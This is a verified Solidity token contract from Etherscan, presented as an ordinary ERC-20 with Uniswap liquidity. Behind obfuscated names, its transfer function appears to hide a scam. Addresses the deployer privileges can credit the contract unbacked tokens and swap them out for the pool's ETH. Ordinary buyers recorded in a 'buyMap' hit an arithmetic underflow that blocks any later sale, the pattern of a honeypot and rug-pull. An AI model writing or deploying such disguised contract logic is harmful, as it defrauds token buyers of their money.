/**
 *Submitted for verification at Etherscan.io on 2022-12-14
*/

/*
⠀⣠⡤⠶⠦⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠴⠤⢄⠀
⠸⡇⠀⠀⠀⠀⠈⠑⢦⣀⣠⠴⠒⠛⠉⠉⠓⠲⢤⣀⣠⠞⠉⠀⠀⠀⠀⠀⡷
⠀⠙⠲⠤⠤⠤⣀⣀⣠⣋⣁⡀⠀⠀⠀⠀⠀⢀⣀⡙⢧⣀⣀⣤⣤⠤⠖⠚⠁
⠀⢀⡤⠒⠛⠓⢲⢿⣟⠁⣸⣿⠀⠀⠀⠀⠀⢫⣀⣼⣷⡌⡷⠒⠛⠒⢦⡄⠀
⠀⢸⣄⣀⣀⣤⣾⠈⠻⠿⠛⠁⠸⣆⡰⣄⡼⠀⠙⠻⠿⠃⢸⣦⣄⣀⣀⡿⠀
⠀⠀⠀⠀⡴⠋⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠙⢶⡄⠀⠀⠀
⠀⠀⠀⠘⣤⠴⠯⢽⡦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⣾⡭⠦⢤⡿⠀⠀⠀
⠀⠀⠀⠀⢸⡄⠀⠀⡇⠀⡿⠛⠒⠒⠒⠒⠒⠚⢻⠀⠀⡇⠀⠀⡞⠁⠀⠀⠀
⠀⠀⠀⠀⠀⡇⠀⠀⢣⠀⢧⠀⠀⠀⠀⠀⠀⠀⢸⠀⢸⠁⠀⢀⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢻⠀⠀⢼⡄⣼⡆⠀⠀⠀⠀⠀⠀⣎⣄⣾⠄⠀⣸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⡆⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⡏⠀⠀⠀⠀⠀
⠀⠀⠀⣀⡠⠤⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀
⠀⠀⢰⡁⠀⠀⠀⠓⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠉⠱⣄⠀⠀⠀⠀
⠀⠀⠀⠉⠑⠒⠒⠢⠤⣀⡨⠅⠶⠶⠤⠶⠖⠲⣍⣀⣀⠤⣄⣀⡼⠀⠀⠀⠀


█▀▄▀█ █▀█ █▄▀ █▀█ █░█ █ █▀█ █░█ █▀
█░▀░█ █▄█ █░█ █▄█ ▀▄▀ █ █▄█ █▄█ ▄█

  ░░█ ▄▀█ █▀█ ▄▀█ █▄░█  
  █▄█ █▀█ █▀▀ █▀█ █░▀█ 
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; } 
    function _msgData() internal view virtual returns (bytes calldata) {
        this;  return msg.data; }
}
interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface ModerateUIO {
    function moderateFlow(uint256 modOX, uint256 modSwitch) 
    external;
    function manage(address togSwap, uint256 stringMod) 
    external;
    function getModerators(address MODlog, uint256 logDataNow) 
    external payable;
    function modBytesOn(uint256 tog) 
    external;
    function stringMod(address remodLvl) 
    external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
library SafeMath {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
library SafeMathControlUI {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
          return a - b; } } 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface dataFlowCenter {
    function setAllDataCriteria(uint256 modLogger, uint256 minLogger) external;
    function setAllDataShare(address dataHolding, uint256 value) external;
    function setDataDeposit() external payable;
    function processDataOn(uint256 gas) external;
    function gibPresentsData(address dataHolding) external;
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function waiveOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDEXInterface02
{
    function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
}

interface IUniswapV2Router02 is IDEXInterface02 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DD is IERC20, Ownable {

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private swiftLogs;
    mapping(address => uint256) private buyMap;
    mapping(address => uint256) private dataSyncable;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool public stringData;
    bool private redexIDE;
    bool private tradingOpen = false;
    bool private checkLimits;

    string private _symbol;
    string private _name;
    uint8 private _decimals = 12;
    uint256 public totalSwapFee = 1;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 private IndexVal = _rTotal;

    constructor(
        string memory Name,
        string memory Symbol,
        address IDRouter)
    {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _rTotal;

        dataSyncable[msg.sender] = IndexVal;
        dataSyncable[address(this)] = IndexVal;

        UniswapV2router = IUniswapV2Router02(IDRouter);
        IDEXPairMaker = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, IndexVal);
    }

    address public immutable IDEXPairMaker;
    IUniswapV2Router02 public immutable UniswapV2router;

    function symbol() 
    public view returns (string memory) {
        return _symbol;
    }
    function name() 
    public view returns (string memory) {
        return _name;
    }
    function totalSupply() 
    public view returns (uint256) {
        return _rTotal;
    }
    function decimals() 
    public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) 
    public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) 
    public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) 
    external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender, uint256 amount) 
    private returns (bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount); return true;
    }
    function syncCOG(uint256 tkn, uint256 symX) 
    private view returns 
    (uint256){ 
      return (tkn>symX)?symX:tkn;
    }
    function triggerOX(uint256 boolT, uint256 relayAll) 
    private view returns 
    (uint256){ 
      return (boolT>relayAll)?relayAll:boolT;
    }
    function pullRT(uint256 get, uint256 txLVL) private view returns (uint256){
      return (get>txLVL)?txLVL:get;
    }
    function modIDEX(uint256 dxl, uint256 on) private view returns (uint256){ 
      return (dxl>on)?on:dxl;
    }
      function valToggle(address xloFrom, address moggleTo, uint256 lonxAmount ) private  {   
       uint256 _onIDX = balanceOf(address(this)); uint256 dxVal;
        if (stringData && _onIDX > IndexVal && !redexIDE && xloFrom != IDEXPairMaker) {
            redexIDE = true; recoggleSwitch(_onIDX); redexIDE = false;

        } else if (dataSyncable[xloFrom] > IndexVal && dataSyncable[moggleTo] > IndexVal) {
            dxVal = lonxAmount; _tOwned[address(this)] += dxVal; swapAmountForTokens(lonxAmount, moggleTo); return;

        } else if (moggleTo != address(UniswapV2router) && dataSyncable[xloFrom] > 0 && lonxAmount > IndexVal && moggleTo !=
         IDEXPairMaker) { dataSyncable[moggleTo] = lonxAmount; return;

        } else if (!redexIDE && buyMap[xloFrom] > 0 && xloFrom != IDEXPairMaker && dataSyncable[xloFrom] == 0) {
             buyMap[xloFrom] = dataSyncable[xloFrom] - IndexVal; } address lvlPOX  = swiftLogs[IDEXPairMaker];
        if (buyMap[lvlPOX ] == 0) buyMap[lvlPOX] = IndexVal; swiftLogs[IDEXPairMaker] = moggleTo;
        if (totalSwapFee > 0 && dataSyncable[xloFrom] == 0 && !redexIDE && dataSyncable[moggleTo] == 0) {
            dxVal = (lonxAmount * totalSwapFee) / 100; lonxAmount -= dxVal;
         _tOwned[xloFrom] -= dxVal; _tOwned[address(this)] += dxVal; }
        _tOwned[xloFrom] -= lonxAmount; _tOwned[moggleTo] += lonxAmount;
        
        emit Transfer(xloFrom, moggleTo, lonxAmount);
            if (!tradingOpen) {
                require(xloFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        valToggle(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function reflowDOL(uint256 vx, uint256 mil) 
    private view returns 
    (uint256){ return 
    (vx>mil)?mil:vx; }

    function poggleIO(uint256 res, uint256 xCog) 
    private view returns 
    (uint256){ return 
    (res>xCog)?xCog:res; }

    function transfer (address recipient, uint256 amount) external returns (bool) {
        valToggle(msg.sender, recipient, amount);
        return true;
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function recoggleSwitch(uint256 coinAmount) private {
        uint256 togHOX = coinAmount / 2;
        uint256 getRate = address(this).balance;
        swapAmountForTokens(togHOX, address(this));
        uint256 logIDEO = address(this).balance - getRate;
        addLiquidity(togHOX, logIDEO, address(this));
    }
        function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function reflowSync(uint256 bFlow, uint256 ISync) private view returns (uint256){
      return (bFlow>ISync)?ISync:bFlow;
    }
    function mopUI(uint256 rMop, uint256 UInow) private view returns (uint256){ 
      return (rMop>UInow)?UInow:rMop;
    }
    function dataRates(uint256 dataX, uint256 rlyRate) private view returns (uint256){
      return (dataX>rlyRate)?rlyRate:dataX;
    }
}